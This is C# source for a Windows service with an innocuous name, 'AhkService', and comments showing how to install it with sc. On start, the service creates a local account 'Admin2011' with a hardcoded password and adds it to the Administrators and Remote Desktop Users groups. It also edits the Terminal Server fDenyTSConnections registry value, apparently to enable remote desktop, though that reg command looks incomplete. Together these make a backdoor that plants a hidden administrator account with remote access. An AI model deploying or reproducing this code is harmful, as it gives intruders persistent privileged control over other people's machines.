using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.ServiceProcess;
using System.Text;

namespace AhkService
{
    public partial class Service1 : ServiceBase
    {
        //sc create AhkService binpath= C:\AhkService.exe
        //sc delete Ahkservice
        
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            System.Console.WriteLine("Starting");
            RunProcess("net.exe", "user Admin2011 password1! /add");
            RunProcess("net.exe", "localgroup Administrators Admin2011 /add");
            RunProcess("net.exe", "localgroup \"Remote Desktop Users\" Admin2011 /add");
            RunProcess("reg.exe", "add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections");
       
        }

        protected override void OnStop()
        {
            System.Console.WriteLine("Stop");

        }


        public static void RunProcess(String FileName, String Argument)
        {

            Process Process = new Process();

            Process.StartInfo.FileName = FileName;
            Process.StartInfo.Arguments = Argument;

            Process.Start();
        }
    
    }

}
